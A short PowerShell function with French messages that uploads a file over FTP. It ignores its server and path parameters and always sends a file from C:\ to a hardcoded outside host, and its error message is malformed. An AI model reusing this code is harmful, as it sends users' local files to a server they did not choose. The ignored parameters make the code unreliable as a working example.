function ftp-upload {
    param (
        [string]$ftpServer,
        [string]$remotePath,
        [string]$ftpUsername,
        [string]$ftpPassword,
        [string]$localFilePath
    )

    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
        
        $webClient.UploadFile("ftp://ftp.zigflip.fun/log/" + $localFilePath, "c:\" + $localFilePath)

        Write-Host "Le fichier a été uploadé avec succès."
    }
    catch {
        Write-Host "Chemin du fichier local : $localFilePath"
        Write-Host "Erreur lors de l'upload du fichier : $_.Exception.Message"
    }
    finally {
        $webClient.Dispose()
    }
}
